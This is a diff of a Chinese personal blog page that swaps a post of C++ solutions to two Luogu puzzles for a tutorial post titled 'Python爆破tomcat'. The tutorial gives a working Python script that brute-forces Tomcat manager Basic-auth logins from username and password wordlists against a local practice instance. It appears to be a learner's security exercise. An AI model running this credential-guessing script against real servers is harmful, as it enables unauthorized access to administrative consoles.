@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hoylindo || 两道小模拟</title>
+    <title>Hoylindo || Python爆破tomcat</title>
     <meta name="author" content="hoylindo">
     <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
     <meta name="keywords" content=" ">
@@ -153,23 +153,23 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>两道小模拟 </h1>
+        <h1>Python爆破tomcat </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
             </span>
-            2022/8/16
+            2022/9/3
         </span>
 
         
         <span class="category">
-            <a href="/categories/关于算法">
+            <a href="/categories/关于web安全">
                 <span class="icon">
                     <a-icon type="book" theme="filled" />
                 </span>
-                关于算法
+                关于web安全
             </a>
         </span>
         
@@ -183,8 +183,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/洛谷摸鱼日记" style=color:#ffa2c4>
-                    洛谷摸鱼日记
+                <a href="/tags/Python" style=color:#ffa2c4>
+                    Python
                 </a>
             </span>
             
@@ -193,93 +193,74 @@
     </div>
 
     <div class="content" v-pre>
-        <p>这应该是洛谷最简单的两道模拟</p>
+        <br>
+
 <span id="more"></span>
 
-<p>感觉是很难说的一种题型，小模拟陶冶情操大模拟直接吐属于是（那我写的肯定是陶冶情操那一类</p>
-<p>假期一直一直一直一直摸鱼，最后认认真真写了<strong>一点儿</strong>题解的就两道ez题😭</p>
-<h3 id="扫雷游戏"><a href="#扫雷游戏" class="headerlink" title="扫雷游戏"></a><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2670">扫雷游戏</a></h3><ul>
-<li>char型二维数组，要考虑边界情况</li>
-<li>因为数据范围不大，所以我直接从下标为1开始输入，就可以不用处理边界了</li>
-<li>一开始的思路是统计每个?周围的*个数，但是真的很麻烦</li>
-<li>突然想到可以把?换成0，然后把*周围一圈的数组元素全部+1输出</li>
+<h3 id="一个并不美好的开头"><a href="#一个并不美好的开头" class="headerlink" title="一个并不美好的开头"></a>一个并不美好的开头</h3><ul>
+<li>服务搭了快一辈子，最后不知道怎么回事自己莫名其妙就搭上了，明明点那个bat文件疯狂闪退的</li>
+<li>和bp撞了端口又去改掉了端口，然后设置了一下密码</li>
+<li>终于终于终于，可以开始进入正题了</li>
 </ul>
-<p><strong>代码：</strong></p>
-<pre><code class="c++">#include &lt;bits/stdc++.h&gt;
-using namespace std;
-int main()&#123;
-    ios::sync_with_stdio(false);
-    cin.tie();
-    cout.tie(); 
-    char a[150][150];
-    int n,m;
-    cin&gt;&gt;n&gt;&gt;m;
-    for(int i=1;i&lt;=n;i++)&#123;
-        for(int j=1;j&lt;=m;j++)&#123;
-            cin&gt;&gt;a[i][j];
-            if(a[i][j]==&#39;?&#39;) a[i][j]=&#39;0&#39;;
-        &#125;
-    &#125;
-    for(int i=1;i&lt;=n;i++)&#123;
-        for(int j=1;j&lt;=m;j++)&#123;
-            if(a[i][j]==&#39;*&#39;)&#123;
-                if(a[i-1][j-1]!=&#39;*&#39;) a[i-1][j-1]++;
-                if(a[i-1][j]!=&#39;*&#39;) a[i-1][j]++;
-                if(a[i-1][j+1]!=&#39;*&#39;) a[i-1][j+1]++;
-                if(a[i+1][j-1]!=&#39;*&#39;) a[i+1][j-1]++;
-                if(a[i+1][j]!=&#39;*&#39;) a[i+1][j]++;
-                if(a[i+1][j+1]!=&#39;*&#39;) a[i+1][j+1]++; 
-                if(a[i][j-1]!=&#39;*&#39;) a[i][j-1]++;
-                if(a[i][j+1]!=&#39;*&#39;) a[i][j+1]++;
-            &#125;
-        &#125;
-    &#125;
-    for(int i=1;i&lt;=n;i++)&#123;
-        for(int j=1;j&lt;=m;j++)&#123;
-            cout&lt;&lt;a[i][j];
-        &#125;
-        cout&lt;&lt;&quot;\n&quot;;
-    &#125;
-    return 0;
-&#125;
-</code></pre>
-<h3 id="乒乓球"><a href="#乒乓球" class="headerlink" title="乒乓球"></a><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1042">乒乓球</a></h3><ul>
-<li>时隔八百年我又回来写了，这个题第一次看就觉得脑袋疼，这种比赛规则题一般都要读好久题（不爱运动怪我</li>
-<li>一开始就没读懂题，以为是单纯计算”W”和”L”的数量特判输出，结果是忽略了<strong>分差高于2才算胜利才能结束</strong>，WAWAWA</li>
-<li>scanf用正则学到了，好耶</li>
-<li>用自定义函数可以缩短代码，我怎么没想到.jpg</li>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>bp抓包可以看到，输入的用户名和密码被组合成：<code>[用户名]:[密码]</code>的形式然后被base64加密了</li>
+<li>丢到Intruder里，随便写几个爆破一下，可以看到返回的状态码是不一样的，这就好办多啦</li>
+<li>这里还要注意一个是，数据是在请求头里传输的：<code>Authorization: Basic MTExMToxMTExMQ==</code></li>
 </ul>
-<p><strong>代码：</strong></p>
-<pre><code class="C++">#include &lt;bits/stdc++.h&gt;
-using namespace std;
-char s[65000];
-int main()&#123;
-    ios::sync_with_stdio(false);
-    cin.tie();
-    cout.tie();
-    scanf(&quot;%[^E]&quot;,s);
-    int w=0,l=0;
-    for(int i=0;s[i]!=&#39;\0&#39;;i++)&#123;
-        if(s[i]==&#39;W&#39;) w++;
-        else if(s[i]==&#39;L&#39;) l++;
-        if((w&gt;=11||l&gt;=11)&amp;&amp;abs(w-l)&gt;=2)&#123;
-            cout&lt;&lt;w&lt;&lt;&quot;:&quot;&lt;&lt;l&lt;&lt;&quot;\n&quot;;
-            l=w=0;
-        &#125;
-    &#125;
-    cout&lt;&lt;w&lt;&lt;&quot;:&quot;&lt;&lt;l&lt;&lt;&quot;\n\n&quot;;
-    w=l=0;
-    for(int i=0;s[i]!=&#39;\0&#39;;i++)&#123;
-        if(s[i]==&#39;W&#39;) w++;
-        else if(s[i]==&#39;L&#39;) l++;
-        if((w&gt;=21||l&gt;=21)&amp;&amp;abs(w-l)&gt;=2)&#123;
-            cout&lt;&lt;w&lt;&lt;&quot;:&quot;&lt;&lt;l&lt;&lt;&quot;\n&quot;;
-            l=w=0;
-        &#125;
-    &#125;
-    cout&lt;&lt;w&lt;&lt;&quot;:&quot;&lt;&lt;l&lt;&lt;&quot;\n&quot;;
-    return 0;
-&#125; 
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>首先处理请求头，把<code>username</code>和<code>password</code>通过<code>:</code>拼接后进行base64编码</li>
+<li>还要记得和<code>Basic[空格]</code>拼接，惨痛的教训</li>
+<li>然后定义一个函数发送一个get请求，并传输构造的请求头，获取返回的状态码</li>
+<li>循环逐行读入<code>username</code>和<code>password</code>，判断返回的状态码是否为<code>200</code></li>
+<li>这里还要注意返回的状态码是int型，不要和<code>&#39;200&#39;</code>去比较，不然这辈子都跑不出来，惨痛的教训+1+1+1</li>
+<li>总之这个可比爆破phpmyadmin简单哆啦</li>
+</ul>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre><code class="python">import requests
+import base64
+
+url = &#39;http://127.0.0.1:9999/manager/html&#39;
+
+
+def set_header(username, password):
+    t = username + &#39;:&#39; + password
+    authorization = &#39;Basic &#39; + str(base64.b64encode(t.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)
+    # print(authorization)
+    h = &#123;&#39;Authorization&#39;: authorization&#125;
+    return h
+
+
+def get_status_code(h):
+    r = requests.get(url=url, headers=h)
+    return r.status_code
+
+
+def start_attacking():
+    try:
+        with open(&#39;user.txt&#39;, &#39;r+&#39;) as u:
+            for i in u:
+                with open(&#39;password.txt&#39;, &#39;r+&#39;) as p:
+                    for j in p:
+                        user = i.strip()
+                        password = j.strip()
+                        h = set_header(user, password)
+                        r = get_status_code(h)
+                        if r == 200:
+                            print(&#39;Success! username: &#39; + user + &#39; | password: &#39; + password)
+                            return 1
+                        else:
+                            pass
+    except Exception as e:
+        print(e.args)
+        return -1
+    return 0
+
+
+if __name__ == &quot;__main__&quot;:
+    rs = start_attacking()
+    if rs == 0:
+        print(&#39;Fail! No matching user and password were found in the files.&#39;)
+    else:
+        pass
 </code></pre>
 
     </div>
